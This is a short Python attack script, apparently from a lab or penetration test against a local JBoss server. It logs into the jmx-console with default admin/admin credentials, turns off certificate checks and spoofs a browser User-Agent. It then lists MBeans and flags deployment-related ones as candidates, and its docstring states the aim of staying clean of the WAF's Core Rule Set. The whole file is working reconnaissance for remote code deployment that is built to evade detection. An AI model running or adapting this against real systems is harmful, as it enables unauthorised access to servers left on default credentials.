# -*- coding: utf-8 -*-
"""List JMX MBeans on jmx-console through the WAF; find deployment-repository
style faces (ASCII form invoke = CRS-clean)."""
import re

import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.get("http://127.0.0.1:18380/jmx-console/HtmlAdaptor", auth=("admin", "admin"),
          timeout=30)
print("HTMLAdaptor default ->", r.status_code, len(r.content))
if r.status_code == 200:
    beans = sorted(set(re.findall(r'action=inspectMBean&amp;name=([^"\']+)', r.text)))
    if not beans:
        beans = sorted(set(re.findall(r'name=([^"&>]+%3A[^"&>]+)', r.text)))
    print("MBeans (%d):" % len(beans))
    for b in beans:
        print("  ", b)
    # grep deployment-ish
    for b in beans:
        if re.search(r'deploy|repository|war|jar|vfs|profileservice|maindeploy', b, re.I):
            print("CANDIDATE:", b)
